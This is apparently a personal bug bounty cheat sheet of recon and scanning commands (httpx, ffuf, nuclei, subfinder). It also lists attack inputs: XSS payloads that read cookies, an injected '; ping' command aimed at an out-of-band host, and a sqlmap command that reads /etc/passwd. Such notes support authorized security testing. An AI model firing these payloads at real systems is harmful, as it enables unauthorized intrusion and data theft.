# Bug Bounty Personal Tips

## Recon 

##### shodan
`http.favicon.hash:123456789`

## HTTPX 

`/home/kali/go/bin/httpx -l FC -ss -srd /media/sf_Test/FC/screenshots/ --title --status-code -o /media/sf_Test/FC_httpx.txt `

`/home/kali/go/bin/httpx -l FC -proxy http://192.168.0.131:1337 `

```
/home/kali/go/bin/httpx -l CHANGEME \
    -p 80,81,443,591,593,832,981,1010,1311,2082,2087,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5800,6543,7000,7396,7474,8000,8001,8008,8014,8042,8069,8080,8081,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9200,9443,9800,9981,12443,16080,18091,18092,20720,28017,11443 \
    -sc -follow-redirects --title -ss -favicon \
    -srd /media/sf_Test/CHANGEME/screenshots/ \
    -o /media/sf_Test/CHANGEME/CHANGEME_httpx.txt \
    -proxy http://192.168.0.131:1337
```

## FUZZ 

```
ffuf -w /media/sf_Test/_CHANGEME/CHANGEME.txt:DOMAINSFUZZ \
     -w /media/sf_Test/https.txt:SCHEMEFUZZ \
     -w /media/sf_Test/filesoptmized.txt:FILESFUZZ \
     -u "SCHEMEFUZZ://DOMAINSFUZZ/FILESFUZZ" -x "http://192.168.0.131:1337" -t 500
```

## XSS
`  : /"><script>alert(document.cookie)</script> `

` %27)+O+%22%3E%3Cscript%3Ealert(document.domain);%3C/script%3E `

## SSRF 
` galletita ; ping -c 1 burp.oastify.com `

## SQLMAP

`sqlmap -u "http://X/dashboard/dashboard.php" --file-read="/etc/passwd"`

### OTHERS
` assetfinder X.com | tee -a /tmp/X.txt`

` cat /tmp/X.txt | httprobe -p http:81 -p https:8443 -p http:8000 -p http:8001 -p http:8181 -t 40000 | tee -a /tmp/X.txt `

`  nuclei -l p.txt -t cves/ -t default-credentials/ -o priceline_results.txt -p http://192.168.100.2:1337`

` subfinder -d X | /home/kali/go/bin/httpx -u -status-code -title -tech-detect -follow-redirects -timeout 5 `

` site:*.com.ar "bug bounty" OR "vulnerability disclosure" OR "security policy" `

